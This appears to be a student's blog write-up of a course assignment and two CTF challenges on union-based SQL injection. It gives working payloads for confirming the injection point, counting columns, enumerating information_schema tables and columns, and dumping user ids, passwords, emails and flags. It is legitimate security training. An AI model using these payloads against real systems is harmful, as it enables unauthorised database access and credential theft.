---
title: "Week 6 - Assignment"
date: 2025-05-29
categories: [assignment]
layout: single
author_profile: true
sidebar:
  nav: "main"
read_time: true
toc: true
toc_label: "On this page"
toc_sticky: true
---

# Assignment 6 - 1 / Extracting Only doldol's Data

## (1). Identify the SQL Injection point
   
![스크린샷 2025-05-29 120037](https://github.com/user-attachments/assets/a7bf66d0-a58e-470b-b149-ac64d4603cd6)

By injecting a condition that always returns true (' OR '1'='1), all user accounts were displayed, confirming that the input is directly inserted into the SQL query.

## (2) Use ORDER BY to find the number of columns

Try injecting:

```
1234' order by [num] #
```

![image](https://github.com/user-attachments/assets/5bac249a-d89f-431d-8ddd-eed745916420)

- No error occurs for Order by 1 to 4
- However order by 5 makes the error
  
This tells us that the query has exactly 4 columns, since trying to sort by a non-existent fifth column causes a failure.

## (3) Use UNION SELECT to determine which columns are displayed

![image](https://github.com/user-attachments/assets/192e5e74-9c6b-4b59-be53-ab9bb6cd305c)

Each number (1, 2, 3, 4) is displayed in a different column on the page.
This confirms that **all four columns** are reflected in the output, meaning we can use any of them to display extracted data later (like usernames, emails, flags, etc.).


## (4) Use database() to find the current database name

![image](https://github.com/user-attachments/assets/e91cf7b5-2d25-409c-a2bb-c9815ce61339)

Try injecting:

```
1234' union select datbase(), 2, 3, 4#
```
The name of database is "segfault_sql"	


## (5) Use information_schema.tables to list all table names

![image](https://github.com/user-attachments/assets/45460560-556b-4688-ae25-27218c0a758c)

Try injecting:

```
1234' union select table_name, 2, 3, 4 from information_schema.tables where table_schema='segfault_sql' #
```
The names of the tables are **game, member, secret and secret_member**.

## (6) Use information_schema.columns to list all column names



Try injecting:

```
1234' union select column_name, 2, 3, 4 from information_schema.columns where table_name = 'member' #
```
The names of the coulmns in **member** table are **user_id, user_pass,	name, user_level, info ,id, pass and email**.



## (7) Finally, use UNION SELECT to extract the data

![image](https://github.com/user-attachments/assets/735d9c72-d0b8-49e1-8f4d-a430dda46d0c)
```
1234' union select id, pass, email, info from member #
```

To extract only **doldol**'s data, modify the payload as follows:

```
' union select id, pass, email, info from member where id='doldol' #
```

**Result:**

![image](https://github.com/user-attachments/assets/dbda74c3-e0f9-4c40-a20f-c9cc8297b36b)

Success!




---

# Assignment 6 - 2 / CTF SQL Injection 1

Find the SQL Injection point
```
bello' or '1'='1 
```
![image](https://github.com/user-attachments/assets/2ac94953-e134-442e-9fca-c7f255916af6)
Result: All user data is displayed → confirms that the input is directly injected into the SQL query.


we use the ORDER BY clause with increasing numbers to find how many columns the original query returns.
```
bello' order by [num] #
```
![image](https://github.com/user-attachments/assets/68c8e490-72c7-41a5-a08e-807ece73ef22)
No error up to ORDER BY 4, but ORDER BY 5 triggers an error.
Conclusion: The query has 4 columns.


We use the UNION SELECT technique to retrieve the name of the current database.
```
bello' union select database(), 2 ,3 ,4 #
```
![image](https://github.com/user-attachments/assets/07c57dd6-43f3-4e5f-bcf1-78c98badbcc9)
Name of Databse: sqli_1


Find the tables in Database
```
' union select table_name, 2, 3 ,4 from information_schema.tables where table_schema = 'sqli_1' #
```
![image](https://github.com/user-attachments/assets/bff2111c-d1cf-49d2-9863-ef79d7211b3a)
Result: Found a table named flag_table.



Find the coulmns in **Flag_table**
```
' union select column_name, 2, 3 ,4 from information_schema.columns where table_name = 'flag_table' #
```
![image](https://github.com/user-attachments/assets/e029b62d-99b6-421d-82cd-3fe6ed6ed37e)


Find the **FLAG** 
```
' union select flag, 2, 3, 4 from flag_table # 
```
![스크린샷 2025-05-29 172917](https://github.com/user-attachments/assets/785e3dc8-bf25-40da-9916-c4ba81273669)


# Assignment 6 - 3 / CTF SQL Injection 2

Firstly, when I searched using any random string, a simple and generic result appeared:
| ID           | Level   | Rank Point | Info |
|--------------|---------|------------|------|
| abcde | ******* | *******    |      |

However, when I searched for normaltic, a special sentence appeared in the info column:

| ID         | Level   | Rank Point | Info                    |
|------------|---------|------------|-------------------------|
| normaltic  | ******* | ********   | my name is normaltic   |

This led me to suspect that the info value is only shown when the ID is specifically 'normaltic'. I assumed that the backend query might look something like this:
```
select ?? from ?? where id =’normaltic’
```
Thus, I attempted a union-based injection:
normaltic' AND '1' = '2' UNION SELECT 1,2,3,4,5,6 #

I assumed that if I inserted a value into the 6th column, it would appear in the info section.

![image](https://github.com/user-attachments/assets/c07dd357-0910-42d0-bcf4-fa236c8cff40)

Founded name of database
Databse: sqli_5
![image](https://github.com/user-attachments/assets/a2306616-c605-4813-9ac8-69661141d422)

Founded name of Table
Table: flag_honey
![image](https://github.com/user-attachments/assets/e4cbe209-c72b-41e4-8298-25c515eebb20)

Founded coulmns of flag_honey
coulmn: flag
![image](https://github.com/user-attachments/assets/18a637ab-8ac5-44e2-8075-69cbf270953a)

Got Fooled...
I tried extracting the flag from the flag_honey table, but it returned nothing.
![image](https://github.com/user-attachments/assets/915a5c10-4288-40b5-abc9-e281ab370c78)

Suspecting There Might Be Other Tables I started to suspect that there could be additional tables I hadn't discovered yet.
So I used the following payloads to enumerate more tables using **LIMIT**

```
normaltic' AND '1'='2' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema = 'sqli_5' LIMIT 1, 1 #
normaltic' AND '1'='2' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema = 'sqli_5' LIMIT 2, 2 #
```
As a result, I found two more tables: game and secret.

![image](https://github.com/user-attachments/assets/b0015620-3027-4b86-9d0d-991448e31fc5)

![image](https://github.com/user-attachments/assets/562b0d3e-23b1-4d8f-b682-4559b9c48d42)


While inspecting the secret table, I found that it also had a flag column.
![image](https://github.com/user-attachments/assets/a29af690-9b7b-4a92-bdb9-ccea8cd89191)

Fooled Again…
I tried dumping the flag but again, no output was shown.
![image](https://github.com/user-attachments/assets/ce3ddb38-2488-407e-a6e8-4b0df351c4e4)

This time, I assumed the flag might be in another row, not the first one.
![image](https://github.com/user-attachments/assets/7a3bc626-b757-4ddc-a18a-54bd0e488058)
Finally, I got the flag!
